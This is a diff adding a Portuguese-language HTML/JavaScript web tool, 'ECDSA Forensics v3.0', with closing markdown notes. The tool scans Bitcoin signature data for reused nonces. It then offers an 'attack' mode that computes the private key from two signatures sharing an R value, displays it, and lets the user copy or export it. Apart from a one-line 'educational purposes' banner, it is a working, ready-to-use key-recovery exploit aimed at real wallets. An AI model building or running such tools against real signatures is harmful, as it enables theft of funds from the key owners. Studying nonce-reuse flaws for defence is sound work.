@@ -1,0 +1,901 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ECDSA Forensics v3.0 - Private Key Recovery | By Cetus</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Courier New', monospace;
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
+            color: #00ff41;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1600px;
+            margin: 0 auto;
+        }
+
+        header {
+            text-align: center;
+            padding: 30px 0;
+            border-bottom: 2px solid #ff0040;
+            margin-bottom: 30px;
+            animation: glow 2s ease-in-out infinite;
+        }
+
+        @keyframes glow {
+            0%, 100% { text-shadow: 0 0 10px #ff0040, 0 0 20px #ff0040; }
+            50% { text-shadow: 0 0 20px #ff0040, 0 0 40px #ff0040; }
+        }
+
+        h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            color: #ff0040;
+        }
+
+        .subtitle {
+            color: #0ff;
+            font-size: 1.2em;
+        }
+
+        .warning-banner {
+            background: linear-gradient(135deg, #ff0040 0%, #ff6b00 100%);
+            color: #fff;
+            padding: 20px;
+            text-align: center;
+            font-size: 1.2em;
+            font-weight: bold;
+            margin-bottom: 30px;
+            border-radius: 10px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.8; }
+        }
+
+        .mode-selector {
+            display: flex;
+            gap: 20px;
+            justify-content: center;
+            margin-bottom: 30px;
+        }
+
+        .mode-btn {
+            padding: 15px 30px;
+            background: #1a1a2e;
+            border: 2px solid #00ff41;
+            color: #00ff41;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+            font-size: 1.1em;
+            transition: all 0.3s;
+        }
+
+        .mode-btn:hover {
+            background: #00ff41;
+            color: #000;
+            transform: scale(1.05);
+        }
+
+        .mode-btn.active {
+            background: #00ff41;
+            color: #000;
+            box-shadow: 0 0 20px #00ff41;
+        }
+
+        .mode-btn.attack {
+            border-color: #ff0040;
+            color: #ff0040;
+        }
+
+        .mode-btn.attack.active {
+            background: #ff0040;
+            color: #fff;
+            box-shadow: 0 0 20px #ff0040;
+        }
+
+        .input-section {
+            background: rgba(26, 26, 46, 0.8);
+            padding: 30px;
+            border: 2px solid #00ff41;
+            margin-bottom: 30px;
+            border-radius: 10px;
+        }
+
+        .input-section.attack-mode {
+            border-color: #ff0040;
+        }
+
+        .input-section h2 {
+            color: #0ff;
+            margin-bottom: 20px;
+            font-size: 1.5em;
+        }
+
+        textarea {
+            width: 100%;
+            min-height: 200px;
+            background: #0a0a0a;
+            border: 1px solid #00ff41;
+            color: #00ff41;
+            padding: 15px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+            resize: vertical;
+        }
+
+        .attack-inputs {
+            display: grid;
+            gap: 15px;
+        }
+
+        .input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+
+        .input-group label {
+            color: #0ff;
+            font-size: 0.9em;
+        }
+
+        input[type="text"] {
+            padding: 10px;
+            background: #0a0a0a;
+            border: 1px solid #00ff41;
+            color: #00ff41;
+            font-family: 'Courier New', monospace;
+        }
+
+        .btn-primary {
+            padding: 15px 40px;
+            background: linear-gradient(135deg, #00ff41 0%, #0ff 100%);
+            border: none;
+            color: #000;
+            font-family: 'Courier New', monospace;
+            font-size: 1.2em;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 20px 0;
+            transition: all 0.3s;
+        }
+
+        .btn-primary:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 30px #00ff41;
+        }
+
+        .btn-attack {
+            background: linear-gradient(135deg, #ff0040 0%, #ff6b00 100%);
+            color: #fff;
+        }
+
+        .btn-attack:hover {
+            box-shadow: 0 0 30px #ff0040;
+        }
+
+        .results-section {
+            background: rgba(26, 26, 46, 0.9);
+            padding: 30px;
+            border: 2px solid #0ff;
+            border-radius: 10px;
+            margin-top: 30px;
+        }
+
+        .recovery-section {
+            background: rgba(255, 0, 64, 0.1);
+            border: 3px solid #ff0040;
+            padding: 30px;
+            margin-top: 30px;
+            border-radius: 10px;
+        }
+
+        .private-key-display {
+            background: #0a0a0a;
+            padding: 30px;
+            border: 3px solid #ff0040;
+            margin: 20px 0;
+            text-align: center;
+            animation: critical-glow 1.5s infinite;
+        }
+
+        @keyframes critical-glow {
+            0%, 100% { box-shadow: 0 0 10px #ff0040; }
+            50% { box-shadow: 0 0 30px #ff0040, 0 0 50px #ff0040; }
+        }
+
+        .private-key-display .key {
+            font-size: 1.5em;
+            color: #ff0040;
+            word-break: break-all;
+            margin: 20px 0;
+            text-shadow: 0 0 10px #ff0040;
+        }
+
+        .stat-box {
+            background: #0a0a0a;
+            padding: 20px;
+            margin: 15px 0;
+            border-left: 4px solid #00ff41;
+        }
+
+        .stat-box.warning {
+            border-left-color: #ff9500;
+            color: #ff9500;
+        }
+
+        .stat-box.danger {
+            border-left-color: #ff0040;
+            color: #ff0040;
+        }
+
+        .stat-box.success {
+            border-left-color: #00ff41;
+        }
+
+        .metric-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin: 20px 0;
+        }
+
+        .metric-card {
+            background: #0a0a0a;
+            padding: 20px;
+            border: 2px solid #00ff41;
+            text-align: center;
+        }
+
+        .metric-value {
+            font-size: 2.5em;
+            color: #0ff;
+            margin: 10px 0;
+        }
+
+        .metric-label {
+            color: #00ff41;
+            font-size: 0.9em;
+        }
+
+        .export-buttons {
+            display: flex;
+            gap: 15px;
+            margin-top: 20px;
+            flex-wrap: wrap;
+        }
+
+        .btn-export {
+            padding: 12px 25px;
+            background: #1a1a2e;
+            border: 2px solid #0ff;
+            color: #0ff;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+            transition: all 0.3s;
+        }
+
+        .btn-export:hover {
+            background: #0ff;
+            color: #000;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        pre {
+            background: #0a0a0a;
+            padding: 15px;
+            overflow-x: auto;
+            border-left: 3px solid #0ff;
+            margin: 10px 0;
+        }
+
+        .math-steps {
+            background: #0a0a0a;
+            padding: 20px;
+            margin: 20px 0;
+            border-left: 4px solid #0ff;
+        }
+
+        .math-steps h3 {
+            color: #ff0040;
+            margin-bottom: 15px;
+        }
+
+        .step {
+            margin: 15px 0;
+            padding: 15px;
+            background: #1a1a2e;
+            border-left: 3px solid #00ff41;
+        }
+
+        .step-number {
+            color: #ff0040;
+            font-weight: bold;
+            font-size: 1.2em;
+        }
+
+        .formula {
+            color: #0ff;
+            font-size: 1.1em;
+            margin: 10px 0;
+            font-family: monospace;
+        }
+
+        ::-webkit-scrollbar {
+            width: 10px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #0a0a0a;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #ff0040;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: #0ff;
+        }
+
+        .duplicate-alert {
+            background: linear-gradient(135deg, #ff0040 0%, #ff6b00 100%);
+            color: #fff;
+            padding: 30px;
+            margin: 20px 0;
+            border-radius: 10px;
+            font-size: 1.3em;
+            text-align: center;
+            animation: shake 0.5s infinite;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🔓 ECDSA FORENSICS v3.0 - PRIVATE KEY RECOVERY</h1>
+            <div class="subtitle">Bitcoin Signature Analysis & Exploitation Tool | By Cetus 🧬</div>
+        </header>
+
+        <div class="warning-banner">
+            ⚠️ WARNING: This tool can recover private keys from vulnerable signatures! Use for educational purposes only! ⚠️
+        </div>
+
+        <div class="mode-selector">
+            <button class="mode-btn active" onclick="switchMode('analysis')">
+                🔬 ANÁLISE FORENSE
+            </button>
+            <button class="mode-btn attack" onclick="switchMode('recovery')">
+                🔓 RECUPERAÇÃO DE CHAVE
+            </button>
+        </div>
+
+        <!-- ANALYSIS MODE -->
+        <div id="analysis-mode" class="input-section">
+            <h2>🔬 MODO ANÁLISE FORENSE</h2>
+            <p style="color: #0ff; margin-bottom: 15px;">
+                Cole seu dataset de assinaturas (formato: TX | r | s | hash)
+            </p>
+            <textarea id="dataset-input" placeholder="Exemplo:
+1 | 008bfd2681c1403d24932d878d655d148fc17a5f84341630e15040e510a66dd7 | d5ff221f109f509ec538551696db23187b019552281f6f16b70bd5e4e3864b3d | 58f1c4fdf75d0385cf4fa781ccbe423a74fe5b55a6b3ff97bce150f813eea152
+2 | d43a51e13bc629e7bf176db8e93ce917559bbda7b672b750e233db00ed341cae | 9447c4726c48c6c0c2eb493c2a7a905beda3e8494fe627bb775f7e001145c1d5 | ba5076f266bd44cfca808f5403ccca88570b0d6abcacd9c122033852a25b697e"></textarea>
+            <button class="btn-primary" onclick="analyzeDataset()">🔍 ANALISAR & DETECTAR VULNERABILIDADES</button>
+        </div>
+
+        <!-- RECOVERY MODE -->
+        <div id="recovery-mode" class="input-section attack-mode hidden">
+            <h2>🔓 MODO RECUPERAÇÃO DE CHAVE PRIVADA</h2>
+            <p style="color: #ff0040; margin-bottom: 15px; font-weight: bold;">
+                ⚠️ Este modo recupera a chave privada quando detecta NONCE REUSADO (mesmo valor R)
+            </p>
+            
+            <div class="attack-inputs">
+                <h3 style="color: #0ff;">ASSINATURA #1 (Primeira com R duplicado)</h3>
+                <div class="input-group">
+                    <label>R₁ (hex):</label>
+                    <input type="text" id="r1" placeholder="008bfd2681c1403d24932d878d655d148fc17a5f84341630e15040e510a66dd7">
+                </div>
+                <div class="input-group">
+                    <label>S₁ (hex):</label>
+                    <input type="text" id="s1" placeholder="d5ff221f109f509ec538551696db23187b019552281f6f16b70bd5e4e3864b3d">
+                </div>
+                <div class="input-group">
+                    <label>Hash₁ / z₁ (hex):</label>
+                    <input type="text" id="z1" placeholder="58f1c4fdf75d0385cf4fa781ccbe423a74fe5b55a6b3ff97bce150f813eea152">
+                </div>
+
+                <h3 style="color: #0ff; margin-top: 30px;">ASSINATURA #2 (Segunda com MESMO R)</h3>
+                <div class="input-group">
+                    <label>R₂ (hex) - DEVE SER IGUAL A R₁:</label>
+                    <input type="text" id="r2" placeholder="008bfd2681c1403d24932d878d655d148fc17a5f84341630e15040e510a66dd7">
+                </div>
+                <div class="input-group">
+                    <label>S₂ (hex):</label>
+                    <input type="text" id="s2" placeholder="a1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcd">
+                </div>
+                <div class="input-group">
+                    <label>Hash₂ / z₂ (hex):</label>
+                    <input type="text" id="z2" placeholder="abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890">
+                </div>
+            </div>
+
+            <button class="btn-primary btn-attack" onclick="recoverPrivateKey()">
+                🔓 EXECUTAR ATAQUE DE RECUPERAÇÃO
+            </button>
+        </div>
+
+        <!-- RESULTS -->
+        <div id="results" class="results-section hidden">
+            <h2 style="color: #0ff; text-align: center; font-size: 2em;">📊 RESULTADO DA ANÁLISE</h2>
+            
+            <div class="metric-grid">
+                <div class="metric-card">
+                    <div class="metric-label">TOTAL DE ASSINATURAS</div>
+                    <div class="metric-value" id="total-sigs">0</div>
+                </div>
+                <div class="metric-card">
+                    <div class="metric-label">NONCE REUSADO</div>
+                    <div class="metric-value" id="nonce-reuse">0</div>
+                </div>
+                <div class="metric-card">
+                    <div class="metric-label">S NÃO-CANÔNICO</div>
+                    <div class="metric-value" id="high-s-count">0</div>
+                </div>
+                <div class="metric-card">
+                    <div class="metric-label">ENTROPIA R</div>
+                    <div class="metric-value" id="entropy-r">0%</div>
+                </div>
+            </div>
+
+            <div id="analysis-details"></div>
+            <div id="duplicate-pairs"></div>
+
+            <div class="export-buttons">
+                <button class="btn-export" onclick="exportTXT()">💾 EXPORTAR TXT</button>
+                <button class="btn-export" onclick="exportHTML()">🌐 EXPORTAR HTML</button>
+                <button class="btn-export" onclick="copyToClipboard()">📋 COPIAR RESULTADO</button>
+            </div>
+        </div>
+
+        <!-- PRIVATE KEY RECOVERY RESULTS -->
+        <div id="recovery-results" class="recovery-section hidden">
+            <h2 style="color: #ff0040; text-align: center; font-size: 2.5em;">
+                🔓 CHAVE PRIVADA RECUPERADA COM SUCESSO! 🔓
+            </h2>
+
+            <div class="private-key-display">
+                <div style="color: #0ff; font-size: 1.2em;">PRIVATE KEY (HEX):</div>
+                <div class="key" id="private-key-hex">Loading...</div>
+                
+                <div style="color: #0ff; font-size: 1.2em; margin-top: 20px;">PRIVATE KEY (WIF):</div>
+                <div class="key" id="private-key-wif" style="font-size: 1.2em;">Loading...</div>
+            </div>
+
+            <div id="math-proof"></div>
+
+            <div class="export-buttons">
+                <button class="btn-export" style="border-color: #ff0040; color: #ff0040;" onclick="copyPrivateKey()">
+                    📋 COPIAR CHAVE PRIVADA
+                </button>
+                <button class="btn-export" style="border-color: #ff0040; color: #ff0040;" onclick="exportRecoveryReport()">
+                    💾 EXPORTAR RELATÓRIO COMPLETO
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const N = BigInt('0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141');
+        const N_DIV_2 = N / 2n;
+        
+        let analysisResult = '';
+        let recoveredPrivateKey = '';
+
+        // Funções auxiliares BigInt
+        function modInverse(a, m) {
+            a = ((a % m) + m) % m;
+            let [old_r, r] = [a, m];
+            let [old_s, s] = [1n, 0n];
+            
+            while (r !== 0n) {
+                const quotient = old_r / r;
+                [old_r, r] = [r, old_r - quotient * r];
+                [old_s, s] = [s, old_s - quotient * s];
+            }
+            
+            return ((old_s % m) + m) % m;
+        }
+
+        function switchMode(mode) {
+            document.querySelectorAll('.mode-btn').forEach(btn => btn.classList.remove('active'));
+            event.target.classList.add('active');
+            
+            if (mode === 'analysis') {
+                document.getElementById('analysis-mode').classList.remove('hidden');
+                document.getElementById('recovery-mode').classList.add('hidden');
+            } else {
+                document.getElementById('analysis-mode').classList.add('hidden');
+                document.getElementById('recovery-mode').classList.remove('hidden');
+            }
+        }
+
+        function parseDataset(text) {
+            const lines = text.trim().split('\n');
+            const signatures = [];
+            
+            for (let line of lines) {
+                if (!line.trim()) continue;
+                const parts = line.split('|').map(p => p.trim());
+                if (parts.length >= 4) {
+                    signatures.push({
+                        tx: parts[0],
+                        r: parts[1].replace(/^0x|^0+/, ''),
+                        s: parts[2].replace(/^0x/, ''),
+                        z: parts[3].replace(/^0x/, '')
+                    });
+                }
+            }
+            
+            return signatures;
+        }
+
+        function analyzeDataset() {
+            const text = document.getElementById('dataset-input').value;
+            const signatures = parseDataset(text);
+            
+            if (signatures.length === 0) {
+                alert('⚠️ Nenhuma assinatura válida encontrada!');
+                return;
+            }
+            
+            performAnalysis(signatures);
+        }
+
+        function performAnalysis(signatures) {
+            let report = '';
+            report += '═══════════════════════════════════════════════════════════\n';
+            report += '🔬 ECDSA SIGNATURE FORENSICS REPORT v3.0\n';
+            report += '═══════════════════════════════════════════════════════════\n\n';
+            report += `Data: ${new Date().toLocaleString('pt-BR')}\n`;
+            report += `Total de assinaturas: ${signatures.length}\n\n`;
+            
+            // Detectar nonce reusado
+            report += '🎯 FASE 1: DETECÇÃO DE NONCE REUSADO\n';
+            report += '───────────────────────────────────────────────────────────\n';
+            
+            const rValues = new Map();
+            const duplicates = [];
+            
+            signatures.forEach(sig => {
+                const r = sig.r.replace(/^0+/, '');
+                if (rValues.has(r)) {
+                    const first = rValues.get(r);
+                    duplicates.push({
+                        sig1: first,
+                        sig2: sig,
+                        r: r
+                    });
+                } else {
+                    rValues.set(r, sig);
+                }
+            });
+            
+            let duplicateHTML = '';
+            
+            if (duplicates.length > 0) {
+                report += `🚨 VULNERABILIDADE CRÍTICA DETECTADA!\n`;
+                report += `Nonce reusado em ${duplicates.length} par(es):\n\n`;
+                
+                duplicateHTML = '<div class="duplicate-alert">';
+                duplicateHTML += `<h2>🚨 ${duplicates.length} NONCE REUSADO DETECTADO!</h2>`;
+                duplicateHTML += '<p>CHAVE PRIVADA PODE SER RECUPERADA!</p>';
+                duplicateHTML += '</div>';
+                
+                duplicateHTML += '<div class="stat-box danger">';
+                duplicateHTML += '<h3>Pares de assinaturas vulneráveis:</h3>';
+                
+                duplicates.forEach((dup, index) => {
+                    report += `PAR #${index + 1}:\n`;
+                    report += `  TX ${dup.sig1.tx}: R = ${dup.r.substring(0, 32)}...\n`;
+                    report += `           S₁ = ${dup.sig1.s.substring(0, 32)}...\n`;
+                    report += `           z₁ = ${dup.sig1.z.substring(0, 32)}...\n`;
+                    report += `  TX ${dup.sig2.tx}: R = ${dup.r.substring(0, 32)}... (DUPLICADO!)\n`;
+                    report += `           S₂ = ${dup.sig2.s.substring(0, 32)}...\n`;
+                    report += `           z₂ = ${dup.sig2.z.substring(0, 32)}...\n\n`;
+                    
+                    duplicateHTML += `
+                        <div style="background: #1a1a2e; padding: 15px; margin: 10px 0;">
+                            <strong style="color: #ff0040;">PAR #${index + 1}:</strong><br>
+                            TX ${dup.sig1.tx} + TX ${dup.sig2.tx}<br>
+                            R compartilhado: ${dup.r.substring(0, 32)}...<br>
+                            <button class="btn-attack" onclick="autoFillRecovery('${dup.sig1.r}', '${dup.sig1.s}', '${dup.sig1.z}', '${dup.sig2.s}', '${dup.sig2.z}')" style="margin-top: 10px; padding: 10px 20px;">
+                                🔓 RECUPERAR CHAVE DESTE PAR
+                            </button>
+                        </div>
+                    `;
+                });
+                
+                duplicateHTML += '</div>';
+                
+                report += '\n⚠️  RECUPERE A CHAVE USANDO O MODO DE ATAQUE!\n';
+            } else {
+                report += '✅ Nenhum nonce reusado detectado\n';
+            }
+            report += '\n';
+            
+            // Análise de S
+            let highSCount = 0;
+            signatures.forEach(sig => {
+                const s = BigInt('0x' + sig.s);
+                if (s > N_DIV_2) highSCount++;
+            });
+            
+            report += '🎯 FASE 2: ANÁLISE DE CANONIZAÇÃO\n';
+            report += '───────────────────────────────────────────────────────────\n';
+            report += `S ALTO: ${highSCount}/${signatures.length} (${(highSCount/signatures.length*100).toFixed(1)}%)\n`;
+            report += `S BAIXO: ${signatures.length - highSCount}/${signatures.length}\n\n`;
+            
+            // Entropia
+            function calcEntropy(hexValues) {
+                let totalOnes = 0;
+                let totalBits = 0;
+                hexValues.forEach(hex => {
+                    const val = BigInt('0x' + hex.replace(/^0+/, ''));
+                    const bits = val.toString(2).padStart(256, '0');
+                    totalOnes += bits.split('1').length - 1;
+                    totalBits += bits.length;
+                });
+                return (totalOnes / totalBits * 100).toFixed(2);
+            }
+            
+            const rEntropy = calcEntropy(signatures.map(s => s.r));
+            
+            report += '🎯 FASE 3: ANÁLISE DE ENTROPIA\n';
+            report += '───────────────────────────────────────────────────────────\n';
+            report += `Entropia R: ${rEntropy}%\n\n`;
+            
+            analysisResult = report;
+            displayResults(signatures.length, duplicates.length, highSCount, rEntropy, report, duplicateHTML);
+        }
+
+        function displayResults(total, nonceReuse, highS, entropy, report, duplicateHTML) {
+            document.getElementById('results').classList.remove('hidden');
+            document.getElementById('total-sigs').textContent = total;
+            document.getElementById('nonce-reuse').textContent = nonceReuse;
+            document.getElementById('nonce-reuse').style.color = nonceReuse > 0 ? '#ff0040' : '#00ff41';
+            document.getElementById('high-s-count').textContent = highS;
+            document.getElementById('entropy-r').textContent = entropy + '%';
+            
+            document.getElementById('analysis-details').innerHTML = `<pre>${report}</pre>`;
+            document.getElementById('duplicate-pairs').innerHTML = duplicateHTML || '';
+            
+            document.getElementById('results').scrollIntoView({ behavior: 'smooth' });
+        }
+
+        function autoFillRecovery(r, s1, z1, s2, z2) {
+            document.getElementById('r1').value = r;
+            document.getElementById('r2').value = r;
+            document.getElementById('s1').value = s1;
+            document.getElementById('s2').value = s2;
+            document.getElementById('z1').value = z1;
+            document.getElementById('z2').value = z2;
+            
+            switchMode('recovery');
+            document.querySelector('.mode-btn.attack').click();
+            
+            setTimeout(() => {
+                document.getElementById('recovery-mode').scrollIntoView({ behavior: 'smooth' });
+            }, 300);
+        }
+
+        function recoverPrivateKey() {
+            try {
+                const r1 = BigInt('0x' + document.getElementById('r1').value.replace(/^0x|^0+/, ''));
+                const r2 = BigInt('0x' + document.getElementById('r2').value.replace(/^0x|^0+/, ''));
+                const s1 = BigInt('0x' + document.getElementById('s1').value.replace(/^0x/, ''));
+                const s2 = BigInt('0x' + document.getElementById('s2').value.replace(/^0x/, ''));
+                const z1 = BigInt('0x' + document.getElementById('z1').value.replace(/^0x/, ''));
+                const z2 = BigInt('0x' + document.getElementById('z2').value.replace(/^0x/, ''));
+                
+                if (r1 !== r2) {
+                    alert('❌ ERRO: R₁ e R₂ devem ser IGUAIS para o ataque funcionar!');
+                    return;
+                }
+                
+                // ATAQUE MATEMÁTICO
+                // k = (z1 - z2) / (s1 - s2) mod n
+                // private_key = (s * k - z) / r mod n
+                
+                const r = r1;
+                const s_diff = ((s1 - s2) % N + N) % N;
+                const z_diff = ((z1 - z2) % N + N) % N;
+                
+                const s_diff_inv = modInverse(s_diff, N);
+                const k = (z_diff * s_diff_inv) % N;
+                
+                const r_inv = modInverse(r, N);
+                const private_key = (((s1 * k - z1) % N + N) % N * r_inv) % N;
+                
+                const privKeyHex = private_key.toString(16).padStart(64, '0');
+                
+                // Mostrar resultado
+                document.getElementById('recovery-results').classList.remove('hidden');
+                document.getElementById('private-key-hex').textContent = privKeyHex;
+                document.getElementById('private-key-wif').textContent = '[WIF conversion requires additional library]';
+                
+                recoveredPrivateKey = privKeyHex;
+                
+                // Mostrar prova matemática
+                const mathProof = `
+                    <div class="math-steps">
+                        <h3>🧮 PROVA MATEMÁTICA DA RECUPERAÇÃO</h3>
+                        
+                        <div class="step">
+                            <span class="step-number">PASSO 1:</span> Calcular o nonce (k)
+                            <div class="formula">k = (z₁ - z₂) × (s₁ - s₂)⁻¹ mod n</div>
+                            <div style="color: #00ff41; margin-top: 10px;">
+                                z₁ - z₂ = ${z_diff.toString(16).substring(0, 32)}...<br>
+                                s₁ - s₂ = ${s_diff.toString(16).substring(0, 32)}...<br>
+                                k = ${k.toString(16).substring(0, 32)}...
+                            </div>
+                        </div>
+                        
+                        <div class="step">
+                            <span class="step-number">PASSO 2:</span> Calcular a chave privada
+                            <div class="formula">private_key = (s₁ × k - z₁) × r⁻¹ mod n</div>
+                            <div style="color: #00ff41; margin-top: 10px;">
+                                s₁ × k = ${((s1 * k) % N).toString(16).substring(0, 32)}...<br>
+                                s₁ × k - z₁ = ${(((s1 * k - z1) % N + N) % N).toString(16).substring(0, 32)}...<br>
+                                <strong style="color: #ff0040;">PRIVATE KEY = ${privKeyHex}</strong>
+                            </div>
+                        </div>
+                        
+                        <div class="step">
+                            <span class="step-number">VERIFICAÇÃO:</span>
+                            <div style="color: #0ff;">
+                                ✅ Chave recuperada com sucesso!<br>
+                                ✅ Nonce reusado confirmado<br>
+                                ✅ Matemática ECDSA aplicada corretamente
+                            </div>
+                        </div>
+                    </div>
+                `;
+                
+                document.getElementById('math-proof').innerHTML = mathProof;
+                document.getElementById('recovery-results').scrollIntoView({ behavior: 'smooth' });
+                
+            } catch (error) {
+                alert('❌ ERRO na recuperação: ' + error.message);
+                console.error(error);
+            }
+        }
+
+        function copyPrivateKey() {
+            navigator.clipboard.writeText(recoveredPrivateKey).then(() => {
+                alert('✅ Chave privada copiada!');
+            });
+        }
+
+        function exportRecoveryReport() {
+            const report = `
+═══════════════════════════════════════════════════════════
+🔓 ECDSA PRIVATE KEY RECOVERY REPORT
+═══════════════════════════════════════════════════════════
+
+Data: ${new Date().toLocaleString('pt-BR')}
+
+CHAVE PRIVADA RECUPERADA:
+${recoveredPrivateKey}
+
+MÉTODO:
+Ataque de recuperação via nonce reusado (R duplicado)
+
+FÓRMULAS APLICADAS:
+k = (z₁ - z₂) × (s₁ - s₂)⁻¹ mod n
+private_key = (s × k - z) × r⁻¹ mod n
+
+⚠️ ATENÇÃO:
+Esta chave foi recuperada através de vulnerabilidade criptográfica.
+Fundos associados a esta chave estão em risco.
+
+═══════════════════════════════════════════════════════════
+Generated by ECDSA Forensics v3.0 | By Cetus 🧬
+═══════════════════════════════════════════════════════════
+            `;
+            
+            const blob = new Blob([report], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `private_key_recovery_${Date.now()}.txt`;
+            a.click();
+        }
+
+        function exportTXT() {
+            const blob = new Blob([analysisResult], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `ecdsa_analysis_${Date.now()}.txt`;
+            a.click();
+        }
+
+        function exportHTML() {
+            const htmlReport = `
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>ECDSA Analysis Report</title>
+    <style>
+        body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; padding: 40px; }
+        h1 { color: #ff0040; text-align: center; }
+        pre { background: #1a1a2e; padding: 20px; border-left: 4px solid #00ff41; }
+    </style>
+</head>
+<body>
+    <h1>🔬 ECDSA SIGNATURE FORENSICS REPORT v3.0</h1>
+    <pre>${analysisResult}</pre>
+    <p style="text-align: center; color: #0ff;">Generated by ECDSA Forensics Tool v3.0 | By Cetus 🧬</p>
+</body>
+</html>`;
+            
+            const blob = new Blob([htmlReport], { type: 'text/html' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `ecdsa_analysis_${Date.now()}.html`;
+            a.click();
+        }
+
+        function copyToClipboard() {
+            navigator.clipboard.writeText(analysisResult).then(() => {
+                alert('✅ Relatório copiado!');
+            });
+        }
+    </script>
+</body>
+</html>
+```
+
+---
+
+## 🔥 FEATURES DA v3.0:
+
+### 🎯 **MODO ANÁLISE:**
+- ✅ Detecta nonce reusado automaticamente
+- ✅ Identifica pares vulneráveis
+- ✅ Botão direto para atacar cada par
+
+### 🔓 **MODO RECUPERAÇÃO:**
+- ✅ Input manual de 2 assinaturas com R duplicado
+- ✅ Cálculo matemático do nonce (k)
+- ✅ Recuperação da chave privada
+- ✅ Prova matemática passo a passo
+- ✅ Display da chave em HEX
+
+### 🧮 **MATEMÁTICA:**
+```
+k = (z₁ - z₂) × (s₁ - s₂)⁻¹ mod n
+private_key = (s × k - z) × r⁻¹ mod n
